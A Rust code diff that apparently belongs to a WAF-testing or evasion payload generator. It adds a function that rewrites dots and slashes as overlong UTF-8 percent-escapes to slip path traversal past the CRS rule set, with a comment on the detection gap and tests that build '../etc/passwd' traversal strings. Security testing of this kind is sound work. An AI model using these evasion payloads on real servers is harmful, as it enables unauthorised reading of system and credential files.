@@ -976,6 +976,45 @@ pub fn json_key_unicode_escape(key: &str, value: &str) -> String {
     format!("{{\"{escaped_key}\": {value_json}}}")
 }
 
+/// Overlong UTF-8 encoding of `.` and `/` for path traversal.
+///
+/// CRS GitHub issue #4189 (opened 2025-07, still open) — CRS does
+/// not alert on `%c0%ae%c0%ae%c0%af` (`../` in 2-byte overlong UTF-8).
+/// Servers that strictly decode UTF-8 reject these as malformed; older
+/// JVMs, some C libs (CVE-2017-9805 Struts2), and a non-trivial set
+/// of internal services accept them. WAF gap + permissive backend =
+/// path traversal that the WAF doesn't see.
+///
+/// `width` selects the overlong representation: 2 (default), 3, or 4
+/// bytes. Each level is independently checked by some decoders, so a
+/// 3-byte overlong may pass where a 2-byte one is filtered.
+#[must_use]
+pub fn overlong_utf8_path(path: &str, width: u8) -> String {
+    let dot = match width {
+        2 => "%c0%ae",
+        3 => "%e0%80%ae",
+        _ => "%f0%80%80%ae", // 4-byte default for unknown width
+    };
+    let slash = match width {
+        2 => "%c0%af",
+        3 => "%e0%80%af",
+        _ => "%f0%80%80%af",
+    };
+    let bs = match width {
+        2 => "%c0%5c",
+        3 => "%e0%80%5c",
+        _ => "%f0%80%80%5c",
+    };
+    path.chars()
+        .map(|c| match c {
+            '.' => dot.to_string(),
+            '/' => slash.to_string(),
+            '\\' => bs.to_string(),
+            c => c.to_string(),
+        })
+        .collect()
+}
+
 /// Bidi override wrapper — wraps `reversed_keyword` between U+202E
 /// (RIGHT-TO-LEFT OVERRIDE) and U+202C (POP DIRECTIONAL FORMATTING).
 ///
@@ -1558,6 +1597,37 @@ mod tests {
         let s = json_key_unicode_escape("k", "v\"q");
         // serde_json escapes the inner quote.
         assert!(s.contains("v\\\"q"));
+    }
+
+    // ── overlong_utf8_path tests ───────────────────────────────────────
+
+    #[test]
+    fn overlong_utf8_2byte_dot_slash_replaces() {
+        assert_eq!(overlong_utf8_path("../etc/passwd", 2), "%c0%ae%c0%ae%c0%afetc%c0%afpasswd");
+    }
+
+    #[test]
+    fn overlong_utf8_3byte_dot_slash() {
+        let out = overlong_utf8_path("..", 3);
+        assert_eq!(out, "%e0%80%ae%e0%80%ae");
+    }
+
+    #[test]
+    fn overlong_utf8_4byte_default() {
+        let out = overlong_utf8_path(".", 4);
+        assert_eq!(out, "%f0%80%80%ae");
+    }
+
+    #[test]
+    fn overlong_utf8_preserves_non_traversal_chars() {
+        let out = overlong_utf8_path("../etc/passwd", 2);
+        assert!(out.contains("etc"));
+        assert!(out.contains("passwd"));
+    }
+
+    #[test]
+    fn overlong_utf8_handles_backslash() {
+        assert_eq!(overlong_utf8_path("..\\windows", 2), "%c0%ae%c0%ae%c0%5cwindows");
     }
 
     // ── bidi_inject tests ──────────────────────────────────────────────
